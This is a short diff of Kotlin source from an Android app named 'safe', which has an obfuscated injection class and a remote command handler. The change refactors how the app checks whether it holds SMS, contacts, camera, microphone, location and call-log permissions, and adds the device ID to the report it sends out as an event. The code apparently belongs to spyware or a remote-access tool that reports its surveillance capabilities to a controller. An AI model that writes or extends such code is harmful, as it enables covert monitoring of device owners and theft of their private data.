@@ -5,6 +5,7 @@ import android.media.AudioManager
 import android.provider.Settings
 import android.util.Log
 import com.storm.safe.rock.inject.jbqfkndyx
+import com.storm.safe.rock.p000.PermissionCollector
 import com.storm.safe.rock.service.modules.ActivityMonitor
 import com.storm.safe.rock.util.StringUtil
 import kotlinx.coroutines.Dispatchers
@@ -540,15 +541,13 @@ class AppCommandHandler : CommandHandler {
         withContext(Dispatchers.IO) {
             try {
                 val service = context.service ?: return@withContext
-                val data = JSONObject()
-                data.put("READ_SMS", service.checkSelfPermission("android.permission.READ_SMS") == 0)
-                data.put("READ_CONTACTS", service.checkSelfPermission("android.permission.READ_CONTACTS") == 0)
-                data.put("CAMERA", service.checkSelfPermission("android.permission.CAMERA") == 0)
-                data.put("RECORD_AUDIO", service.checkSelfPermission("android.permission.RECORD_AUDIO") == 0)
-                data.put("READ_PHONE_STATE", service.checkSelfPermission("android.permission.READ_PHONE_STATE") == 0)
-                data.put("ACCESS_FINE_LOCATION", service.checkSelfPermission("android.permission.ACCESS_FINE_LOCATION") == 0)
-                data.put("READ_CALL_LOG", service.checkSelfPermission("android.permission.READ_CALL_LOG") == 0)
+                val permissions = PermissionCollector.collectAll(service)
+                val data = JSONObject().apply {
+                    put("deviceId", service.getAndroidDeviceId())
+                    put("permissions", JSONObject(permissions as Map<*, *>))
+                }
                 context.sendEvent("permissions_status", data)
+                Log.d(TAG, "权限状态已发送: $permissions")
             } catch (e: Exception) {
                 Log.e(TAG, "获取权限状态失败", e)
             }
